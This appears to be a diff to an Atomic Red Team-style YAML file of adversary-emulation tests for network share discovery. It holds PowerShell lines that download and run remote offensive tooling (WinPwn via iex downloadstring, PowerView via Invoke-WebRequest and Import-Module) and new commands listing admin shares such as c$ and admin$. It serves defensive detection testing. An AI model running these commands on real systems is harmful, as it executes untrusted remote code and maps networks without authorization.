@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: String
+      type: string
       default: computer1
   executor:
     command: |
@@ -27,11 +27,11 @@ atomic_tests:
   input_arguments:
     package_checker:
       description: Package checking command. Debian - dpkg -s samba
-      type: String
+      type: string
       default: (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)
     package_installer:
       description: Package installer command. Debian - apt install samba
-      type: String
+      type: string
       default: (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)
   dependency_executor_name: bash
   dependencies:
@@ -56,7 +56,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: String
+      type: string
       default: localhost
   executor:
     command: |
@@ -109,16 +109,17 @@ atomic_tests:
   input_arguments:
     parameters:
       description: ShareFinder parameter
-      type: String
+      type: string
       default: -CheckShareAccess
   dependencies:
   - description: Invoke-ShareFinder module must exist in %TEMP% directory
-    prereq_command: 'if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}'
+    prereq_command: 'if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1) {exit 0} else {exit 1}'
     get_prereq_command: |
-      Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile $env:TEMP\PowerView.ps1
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1
   executor:
     command: |
-      Import-Module $env:TEMP\PowerView.ps1
+      Import-Module PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1
       Invoke-ShareFinder #{parameters}
     name: powershell
 - name: WinPwn - shareenumeration
@@ -132,3 +133,21 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       shareenumeration -noninteractive -consoleoutput
     name: powershell
+- name: Network Share Discovery via dir command
+  auto_generated_guid: 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
+  description: |
+    Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
+    Upon execution avalaible network shares will be displayed in the commandline session
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_ip:
+      description: Computer IP to find a mount on.
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: |
+      dir \\#{computer_ip}\c$
+      dir \\#{computer_ip}\admin$
+      dir \\#{computer_ip}\IPC$
+    name: command_prompt
